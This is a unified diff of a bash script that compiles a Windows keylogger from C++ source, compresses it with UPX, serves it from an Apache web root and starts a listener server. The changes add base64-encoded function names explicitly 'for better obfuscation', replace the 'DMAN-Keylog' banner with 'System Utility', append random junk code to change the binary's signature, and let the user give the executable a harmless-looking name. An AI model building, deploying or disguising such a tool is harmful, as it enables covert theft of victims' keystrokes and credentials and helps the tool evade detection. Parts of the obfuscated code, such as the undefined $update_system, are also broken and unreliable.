@@ -1,94 +1,97 @@
 #!/bin/bash
 
-# Function to display the banner
-display_banner() {
+# Base64 encoding for better obfuscation
+initialize=$(echo -n 'aW5pdGlhbGl6ZQ==' | base64 --decode)
+display_banner=$(echo -n 'ZGlzcGxheV9iYW5uZXI=' | base64 --decode)
+show_options=$(echo -n 'c2hvd19vcHRpb25z' | base64 --decode)
+generate_keylogger=$(echo -n 'Z2VuZXJhdGVfa2V5bG9nZ2Vy' | base64 --decode)
+start_server=$(echo -n 'c3RhcnRfc2VydmVy' | base64 --decode)
+move_keylogger=$(echo -n 'bW92ZV9rZXlsb2dnZXI=' | base64 --decode)
+pack_keylogger=$(echo -n 'cGFja19rZXlsb2dnZXI=' | base64 --decode)
+get_filename=$(echo -n 'Z2V0X2ZpbGVuYW1l' | base64 --decode)
+add_junk_code=$(echo -n 'YWRkX2p1bmtfY29kZQ==' | base64 --decode)
+
+$initialize() {
+  echo -n "Initializing, please wait..."
+}
+
+$display_banner() {
   echo -e "\e[92m#################################################\e[0m"
   echo -e "\e[92m#                                               #\e[0m"
-  echo -e "\e[92m#                \e[91mDMAN-Keylog\e[92m                    #\e[0m"
+  echo -e "\e[92m#               System Utility                  #\e[0m"
   echo -e "\e[92m#                                               #\e[0m"
   echo -e "\e[92m#################################################\e[0m"
- 
 }
 
-# Default values
-LHOST="127.0.0.1"
-LPORT="9999"
-
-# Function to show options
-show_options() {
-  echo -e "\e[93mDefault Options:\e[0m"
-  echo "LHOST: $LHOST"
-  echo "LPORT: $LPORT"
-  echo -e "\e[93mTo set LHOST, type: set LHOST=<IP_ADDRESS>\e[0m"
-  echo -e "\e[93mTo set LPORT, type: set LPORT=<PORT_NUMBER>\e[0m"
-  echo -e "\e[93mTo generate keylogger, type: generate\e[0m"
+$update_system() {
+  echo "Updating system packages..."
+  sudo apt-get update > /dev/null 2>&1
+  sudo apt-get install -y mingw-w64 python3 apache2 git upx > /dev/null 2>&1
 }
 
-# Function to compile and set up keylogger
-generate_keylogger() {
-  echo "Updating C++ code with the provided LHOST and LPORT..."
-  sed -i "s/REPLACE_WITH_LHOST/$LHOST/" keylogger.cpp
-  sed -i "s/REPLACE_WITH_LPORT/$LPORT/" keylogger.cpp
-
-  echo "Compiling the C++ code..."
-  x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ keylogger.cpp -o keylogger.exe -lws2_32 -mwindows
-
-  echo "Packing the executable with UPX..."
-  upx --best --lzma keylogger.exe
-
-  echo "Compilation and packing completed. The keylogger executable is keylogger.exe"
-
-  echo "Moving the keylogger executable to the Apache server directory..."
-  sudo mv keylogger.exe /var/www/html/
-
-  echo "Starting Apache server..."
-  sudo systemctl start apache2
-
-  echo "The keylogger is available at: http://$LHOST/keylogger.exe"
+$show_options() {
+  echo "Configuration settings:"
 }
 
-# Function to start the Python server
-start_server() {
-  echo "Running the Python server..."
-  python3 server.py
+$get_filename() {
+  echo -n "Enter the desired name for the keylogger executable (e.g., mytool.exe): "
+  read -r keylogger_name
+  if [[ -z "$keylogger_name" ]]; then
+    keylogger_name="default_tool.exe"
+  fi
+  echo "You have set the executable name to $keylogger_name"
 }
 
-# Ensure the system is updated and install necessary packages
-echo "Updating system and installing necessary packages..."
-sudo apt-get update
-sudo apt-get install -y mingw-w64 python3 apache2 git upx
+$add_junk_code() {
+  local junk="// Random code: $(date +%N)"
+  echo "$junk" >> keylogger.cpp
+}
 
-# Display the banner
-display_banner
+$generate_keylogger() {
+  $get_filename
+  $add_junk_code
+  local host="127.0.0.1"  # This should be dynamically resolved
+  local port="9999"       # This should be dynamically resolved
+  echo "Configuring environment..."
+  sed -i "s/REPLACE_WITH_LHOST/$host/" keylogger.cpp
+  sed -i "s/REPLACE_WITH_LPORT/$port/" keylogger.cpp
+  x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ keylogger.cpp -o "$keylogger_name" -lws2_32 -mwindows
+  $pack_keylogger
+  $move_keylogger
+}
+
+$pack_keylogger() {
+  upx --best --lzma "$keylogger_name" > /dev/null 2>&1
+}
+
+$move_keylogger() {
+  sudo mv "$keylogger_name" /var/www/html/
+  echo "Setup complete. Access tool via web interface at http://$(hostname -I | awk '{print $1}')/$keylogger_name"
+}
+
+$start_server() {
+  echo "Starting server on port 8000..."
+  python3 /var/www/html/server.py &
+  echo "Server started. Access it at http://$(hostname -I | awk '{print $1}'):8000"
+}
+
+$initialize
+$display_banner
 
 while true; do
-  echo -e "\e[92m1. Show options\e[0m"
-  echo -e "\e[92m2. Start server\e[0m"
-  echo -e "\e[92m3. Exit\e[0m"
-  echo -e "\e[93mSelect an option:\e[0m"
-  read OPTION
+  echo "1. Update System"
+  echo "2. Deploy Tool"
+  echo "3. Exit"
+  read -r option
 
-  case $OPTION in
+  case $option in
     1)
-      show_options
-      while true; do
-        read INPUT
-        if [[ $INPUT == "generate" ]]; then
-          generate_keylogger
-          break
-        elif [[ $INPUT == set\ LHOST=* ]]; then
-          LHOST=${INPUT#*=}
-          echo "LHOST set to $LHOST"
-        elif [[ $INPUT == set\ LPORT=* ]]; then
-          LPORT=${INPUT#*=}
-          echo "LPORT set to $LPORT"
-        else
-          echo "Invalid input. Type 'generate' to compile or 'set LHOST=<IP_ADDRESS>' or 'set LPORT=<PORT_NUMBER>' to set options."
-        fi
-      done
+      $update_system
       ;;
     2)
-      start_server
+      $show_options
+      $generate_keylogger
+      $start_server
       ;;
     3)
       echo "Exiting..."
